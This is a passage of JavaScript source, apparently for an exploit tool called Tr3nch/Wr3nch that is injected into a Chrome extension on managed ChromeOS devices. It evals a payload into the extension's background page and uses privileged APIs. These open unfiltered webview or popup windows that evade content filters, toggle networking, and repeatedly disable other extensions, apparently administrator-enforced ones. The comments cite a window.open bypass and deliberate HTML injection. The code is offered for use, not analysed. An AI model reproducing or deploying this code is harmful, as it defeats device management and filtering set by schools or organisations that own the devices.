                            .querySelector("#bringUp")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.networkingPrivate.enableNetworkType('All');window.close();"
                                );
                            });
                        netBox
                            .querySelector("#bringDown")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.networkingPrivate.disableNetworkType('All');window.close();"
                                );
                            });
                        netBox
                            .querySelector("#refreshNet")
                            .addEventListener("click", () => {
                                function netRefresher() {
                                    chrome.networkingPrivate.enableNetworkType(
                                        "All"
                                    );
                                    chrome.networkingPrivate.getNetworks(
                                        { networkType: "WiFi" },
                                        (networks) => {
                                            let cont =
                                                opener.document.querySelector(
                                                    "#networks"
                                                );
                                            cont.innerText = "";
                                            let e =
                                                document.createElement("p1");
                                            e.innerText = "Known Networks";
                                            cont.append(e);
                                            for (
                                                let i = 0;
                                                i < networks.length;
                                                i++
                                            ) {
                                                let net = networks[i];

                                                let netCont =
                                                    document.createElement(
                                                        "div"
                                                    );
                                                netCont.id = "networkOpt";
                                                netCont.innerText =
                                                    net.Name +
                                                    " - GUID: " +
                                                    net.GUID +
                                                    " - Connection State: " +
                                                    net.ConnectionState +
                                                    " - Security: " +
                                                    net.WiFi.Security;
                                                opener.document
                                                    .querySelector("#networks")
                                                    .append(netCont);
                                            }
                                            window.close();
                                        }
                                    );
                                }
                                asPage(
                                    `${netRefresher.toString()};netRefresher();`
                                );
                            });
                        netBox
                            .querySelector("#connectNet")
                            .addEventListener("click", () => {
                                promptRequest(
                                    "Connect To Network",
                                    "Connect to a network using its GUID",
                                    "Paste GUID here",
                                    (guid) => {
                                        asPage(
                                            `chrome.networkingPrivate.enableNetworkType('All');chrome.networkingPrivate.startConnect('${guid}', () => {window.close();});`
                                        );
                                    }
                                );
                            });

                        if (window.origin.includes("settings")) {
                            let diag = document.createElement("button");
                            diag.innerText = "Open Diagnostics";
                            diag.addEventListener("click", () => {
                                asPage(
                                    "chrome.send('openDiagnostics');window.close();"
                                );
                            });

                            netBox.append(diag);
                        }

                        container.append(netBox);
                    }
                    if (perms.includes("webViewProxy")) {
                        let proxyBox = document.createElement("div");
                        proxyBox.innerHTML = `
						<br>
						<h1>Webview Proxy Spawner</h1>
						<hr>
						<p>Open an unblocked webview tab invisible to some filters.</p>
						<label>
							<input id="proxyUrlBox" value="https://www.google.com/">
						</label>
						<br>
						<button id="proxyUrlButton">Launch Webview</button>
						<button id="popupButton">Launch Popup</button>
						`;
                        proxyBox
                            .querySelector("#proxyUrlButton")
                            .addEventListener("click", () => {
                                /* Thanks bypassi, for the broken SWA window.open bypass! */
                                let proxy = window.open(
                                    "invalid:url",
                                    "_blank"
                                ); /* This is intentionally broken */
                                asExt(
                                    `chrome.tabs.update({url: "${window.origin}"});chrome.tabs.reload();`
                                );

                                proxy.onload = function () {
                                    proxy.document.head.innerText = "";

                                    /* Fix problems with the OOBE */
                                    proxy.document.head =
                                        document.createElement("head");
                                    proxy.document.body =
                                        document.createElement("body");

                                    proxy.document.title = "Tr3nch Webview";
                                    /* Insecure html injection my beloved <3 */
                                    proxy.document.body.innerHTML = `
								<div class="webviewContainer">
									<webview allowscaling="" src="${
                                        document.querySelector("#proxyUrlBox")
                                            .value
                                    }"></webview>
								</div>
								<style>
									.webviewContainer{
										width: 100%;
										height: 100vh;
									}
									body{
										margin: 0px;
									}
									webview, iframe{
										height: 100%;
										width: 100%;
									}
								</style>
								`;
                                };
                            });
                        proxyBox
                            .querySelector("#popupButton")
                            .addEventListener("click", () => {
                                asExt(
                                    `chrome.windows.create({url: "${
                                        document.querySelector("#proxyUrlBox")
                                            .value
                                    }", type: "popup"});`
                                );
                            });

                        if (
                            chrome.runtime
                                .getManifest()
                                .permissions.includes("identity")
                        ) {
                            let cloakButton = document.createElement("button");
                            cloakButton.innerText = "Open Cloaked Window";
                            cloakButton.addEventListener("click", () => {
                                asExt(
                                    `chrome.identity.launchWebAuthFlow({url: '${
                                        document.querySelector("#proxyUrlBox")
                                            .value
                                    }', interactive: true}, () => {});`
                                );
                            });

                            proxyBox.append(cloakButton);
                        }

                        container.append(proxyBox);
                    }
                    if (perms.includes("manExtensions")) {
                        let killBox = document.createElement("div");
                        killBox.innerHTML = `
						<br>
						<h1>Extension Manager</h1>
						<hr>
						<p>Manage extensions installed on the device.</p>
						<label>
							<input id="killIdBox" placeholder="Extension ID Here">
						</label>
						<br>
						<button id="killIdButton">LoopKill Extension</button>
						<button id="resIdButton">Restart Extension</button>
						<button id="updateButton">Update Extensions</button>
						`;
                        killBox
                            .querySelector("#killIdButton")
                            .addEventListener("click", () => {
                                let id =
                                    document.querySelector("#killIdBox").value;
                                function disable(id) {
                                    /* Everything here runs on about:blank! */
                                    document.body.innerHTML =
                                        "<h1>Do not close this page! It is keeping your extension disabled.</h1>";
                                    let ret = true;
                                    console.log(
                                        `Disabling extension by ID: ${id}`
                                    );
                                    setInterval(() => {
                                        ret = !ret;
                                        chrome.developerPrivate.updateExtensionConfiguration(
                                            { extensionId: id, fileAccess: ret }
                                        );
                                    }, 1500);
                                }
                                asPage(
                                    `${disable.toString()};disable('${id}');`
                                );
                            });
                        killBox
                            .querySelector("#resIdButton")
                            .addEventListener("click", () => {
                                let id =
                                    document.querySelector("#killIdBox").value;
                                function restart(id) {
                                    /* We would typically use developerPrivate.restart, but that doesn't work on managed
								extensions, so let's do it my way. */
                                    chrome.developerPrivate.updateExtensionConfiguration(
                                        { extensionId: id, fileAccess: false }
                                    );
                                    chrome.developerPrivate.updateExtensionConfiguration(
                                        { extensionId: id, fileAccess: true }
                                    );
                                    window.close(); /* We don't want the extra page. */
                                }
                                asPage(
                                    `${restart.toString()};restart('${id}');window.close();`
                                );
                            });
                        killBox
                            .querySelector("#updateButton")
                            .querySelector("click", () => {
                                asPage(
                                    "chrome.developerPrivate.autoUpdate();window.close();"
                                );
                            });

                        /* Experimental */
                        document.body.addEventListener("drop", () => {
                            asPage(
                                "chrome.developerPrivate.installDroppedFile();window.close();"
                            );
                        });

                        container.append(killBox);
                    }
                    container.append(
                        document.createElement("br")
                    ); /* Whitespace just to make me feel better */

                    return container;
                };

                let chromeVer = navigator.appVersion.match(
                    /Chrom(e|ium)\/([0-9]+)/
                )[2];

                loadMenuHTML(); /* Load in the base menu */

                let mainContainer = document.querySelector("#opt-container");
                mainContainer.append(
                    loadMenuItems()
                ); /* Create a container for all options and append them */
                mainContainer.append(document.createElement("br"));
            } /* As Page */

            console.log("Injecting Tr3nch into current page");

            if (chrome.runtime.getManifest().manifest_version !== 3) {
                chrome.tabs.getSelected((cur) => {
                    if (cur.url.includes("webstore")) {
                        alert("Wr3nch cannot operate on the chrome webstore.");
                        /* For those curious why, tabs.executeScript has a special case where it will
						refuse to run on the webstore, making Tr3nch impossible to inject into it. */
                        return;
                    }
                    if (cur.url.includes("chrome-untrusted:")) {
                        alert(
                            "Wr3nch cannot be injected into urls with the 'chrome-untrusted:' protocol."
                        );
                        /* The --extensions-on-chrome-urls flag that this relies on does not grant access 
						to the chrome-untrusted protocol, so no access to pages like crosh is possible. */
                        return;
                    }

                    chrome.tabs.executeScript(null, {
                        code: `${tabPayload.toString()}; tabPayload();`,
                        matchAboutBlank: true,
                    });
                    /* If you're wondering why I reiterated tabPayload() at the end, it's because the 
					.toString() method in this case only defines the function in the page, it still needs to be called manually. */
                });
            } else {
                /* For some reason google removed tabs.getSelected in MV3, leading to this jank. */
                chrome.tabs.query({}, (tabs) => {
                    for (let i = 0; i < tabs.length; i++) {
                        let cur = tabs[i];
                        if (cur.active) {
                            if (cur.url.includes("webstore")) {
                                alert(
                                    "Wr3nch cannot operate on the chrome webstore."
                                );
                                /* For those curious why, tabs.executeScript has a special case where it will
								refuse to run on the webstore, making Tr3nch impossible to inject into it. */
                                return;
                            }
                            if (cur.url.includes("chrome-untrusted:")) {
                                alert(
                                    "Wr3nch cannot be injected into urls with the 'chrome-untrusted:' protocol."
                                );
                                /* The --extensions-on-chrome-urls flag that this relies on does not grant access 
								to the chrome-untrusted protocol, so no access to pages like crosh is possible. */
                                return;
                            }

                            chrome.scripting.executeScript({
                                target: { tabId: cur.id },
                                func: tabPayload,
                            });
                        }
                    }
                });
            }
        }; /* On Clicked */

        const action =
            chrome.runtime.getManifest().manifest_version !== 3
                ? chrome.browserAction
                : chrome.action;

        action.enable();


        if (typeof script === 'undefined') {
            action.onClicked.addListener(onClicked)
        }
        else {
                action.onClicked.addListener(() => {
                    if (chrome.runtime.getManifest().manifest_version !== 3) {
                        chrome.tabs.getSelected((cur) => {
                            if (cur.url.includes("webstore")) {
                                alert(
                                    "Wr3nch cannot operate on the chrome webstore."
                                );
                                /* For those curious why, tabs.executeScript has a special case where it will
                                refuse to run on the webstore, making Tr3nch impossible to inject into it. */
                                return;
                            }
                            if (cur.url.includes("chrome-untrusted:")) {
                                alert(
                                    "Wr3nch cannot be injected into urls with the 'chrome-untrusted:' protocol."
                                );
                                /* The --extensions-on-chrome-urls flag that this relies on does not grant access 
                                to the chrome-untrusted protocol, so no access to pages like crosh is possible. */
                                return;
                            }

                            chrome.tabs.executeScript(null, {
                                code: `${script}; script();`,
                                matchAboutBlank: true,
                            });
                            /* If you're wondering why I reiterated tabPayload() at the end, it's because the 
                            .toString() method in this case only defines the function in the page, it still needs to be called manually. */
                        });
                    } else {
                        /* For some reason google removed tabs.getSelected in MV3, leading to this jank. */
                        chrome.tabs.query({}, (tabs) => {
                            for (let i = 0; i < tabs.length; i++) {
                                let cur = tabs[i];
                                if (cur.active) {
                                    if (cur.url.includes("webstore")) {
                                        alert(
                                            "Wr3nch cannot operate on the chrome webstore."
                                        );
                                        /* For those curious why, tabs.executeScript has a special case where it will
                                        refuse to run on the webstore, making Tr3nch impossible to inject into it. */
                                        return;
                                    }
                                    if (cur.url.includes("chrome-untrusted:")) {
                                        alert(
                                            "Wr3nch cannot be injected into urls with the 'chrome-untrusted:' protocol."
                                        );
                                        /* The --extensions-on-chrome-urls flag that this relies on does not grant access 
                                        to the chrome-untrusted protocol, so no access to pages like crosh is possible. */
                                        return;
                                    }

                                    chrome.scripting.executeScript({
                                        target: { tabId: cur.id },
                                        func: script,
                                    });
                                }
                            }
                        });
                    }
                });
        }
    } /* As Background Page */

    let manifest = chrome.runtime.getManifest();
    if (!manifest.browser_action && !manifest.action) {
        alert(
            "Current extension does not have browserAction permissions, cannot continue."
        );
        return;
    }
    /* The quotations prevent it from accepting 'wasm-unsafe-eval' which won't work */
    if (
        manifest.manifest_version !== 3 &&
        !manifest.content_security_policy.includes("'unsafe-eval'")
    ) {
        alert(
            "Current extension does not have permission to use eval, cannot continue."
        );
        return;
    }

    if (
        manifest.manifest_version == 3 &&
        !manifest.permissions.includes("scripting")
    ) {
        alert(
            "Current extension does not have scripting permissions, cannot continue."
        );
        return;
    }
    /* Cool perk of sh0vel: The extension requires eval to work, so we can run code directly
	as the background page to get persistence until the extension restarts */
    if (background.location.href !== location.href) {
        background.eval(`${payload.toString()};payload();`);
        document.documentElement.innerHTML = `
		<!DOCTYPE html>
		<html lang="en">
			<head>
				<title>Wr3nch Loader</title>
				<meta charset="utf-8">
				<base target="_self">
			</head>
			<body>
				<h1>Wr3nch Injected Successfully</h1>
				<p>
					Wr3nch has been injected successfully. This tab will close automatically in 5 seconds.
				</p>
			</body>
			<style>
				h1{
					font-weight: bold;
				}
				body{
					text-align: center;
				}
			</style>
		</html>
		`;
        if (manifest.manifest_version !== 3)
            setTimeout(() => {
                chrome.tabs.getSelected((tab) => {
                    chrome.tabs.remove(tab.id); /* window.close is annoying */
                });
            }, 5000);
    } else {
        payload(); /* If this is already running as the background page then we don't need to use eval. */
    }
};

if (chrome.runtime.getManifest().manifest_version !== 3) {
    chrome.runtime.getBackgroundPage(withBackground);
} else {
    withBackground(
        this
    ); /* We can't access the service worker or eval on MV3, so we'll do the best we've got. */
}
